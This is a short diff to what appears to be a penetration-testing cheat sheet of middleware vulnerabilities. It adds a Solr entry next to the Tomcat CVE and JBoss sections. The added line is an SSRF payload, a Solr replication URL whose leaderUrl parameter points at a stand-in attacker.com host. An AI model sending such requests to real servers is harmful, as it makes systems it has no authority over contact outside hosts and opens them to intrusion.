@@ -135,6 +135,11 @@ Tomcat
 	- CVE-2016-8735
 	- CVE-2017-12615
 
+solr
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ SSRF
+	- ``https://target.com/solr/de/replication?command=fetchindex&leaderUrl=https://attacker.com``
+
 Jboss
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 + 端口：8080
